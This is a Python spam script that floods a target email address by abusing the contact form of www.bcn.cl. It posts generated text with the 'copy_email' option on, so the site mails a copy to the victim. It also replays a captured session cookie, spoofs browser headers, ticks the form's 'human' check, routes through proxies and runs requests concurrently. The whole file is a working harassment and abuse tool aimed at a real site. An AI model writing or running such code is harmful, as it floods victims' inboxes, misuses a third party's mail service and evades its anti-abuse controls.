from os.path import basename

import requests

from module import Spam

cookies = {
    'webpy_session_id': '83cb87b921528068410ae288781382b715b15a40',
    '_ga': 'GA1.1.34250607.1676366448',
    '_ga_QLTSW3NZ4C': 'GS1.1.1676366448.1.1.1676366715.0.0.0',
}

headers = {
    'authority': 'www.bcn.cl',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'webpy_session_id=83cb87b921528068410ae288781382b715b15a40; _ga=GA1.1.34250607.1676366448; _ga_QLTSW3NZ4C=GS1.1.1676366448.1.1.1676366715.0.0.0',
    'origin': 'https://www.bcn.cl',
    'referer': 'https://www.bcn.cl/wdlrsp/contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'email': target,
            'priority': 'Low',
            'copy_email': 'on',
            'human': 'on',
            'message': self.get_text(),
        }

        response = requests.post('https://www.bcn.cl/wdlrsp/contact', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=10)
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3])
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
